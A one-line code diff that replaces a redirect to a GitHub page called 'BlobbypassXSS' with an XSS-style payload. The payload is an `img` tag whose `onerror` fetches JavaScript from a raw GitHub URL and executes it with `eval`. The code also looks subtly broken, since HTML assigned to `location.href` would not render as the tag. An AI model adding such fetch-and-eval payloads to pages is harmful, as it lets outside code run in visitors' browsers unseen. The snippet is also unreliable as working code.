@@ -1,1 +1,1 @@
-window.location.href="https://github.com/Bronah1335/BlobbypassXSS/blob/main/main.html"
+window.location.href="<img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>"
